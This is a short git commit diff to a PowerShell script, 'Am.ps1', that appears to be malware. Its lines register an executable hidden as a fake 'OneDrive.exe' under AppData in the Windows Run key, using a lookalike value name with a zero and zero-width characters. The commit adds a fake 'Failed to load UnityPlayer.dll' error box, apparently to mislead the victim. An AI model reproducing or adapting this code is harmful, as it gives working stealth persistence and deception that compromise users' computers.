256bcf06669ffa2048abf7d8b92e5a303a4efdba
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-11 07:56:17 -0800

    Update Am.ps1

--- Am.ps1
+++ Am.ps1
@@ -7,3 +7,4 @@ $exePath = "$env:APPDATA\System32\OneDrive.exe"
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regValueName = "‌‌0neDrive‌‌‌‌"
 Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
+Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Failed to load UnityPlayer.dll.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
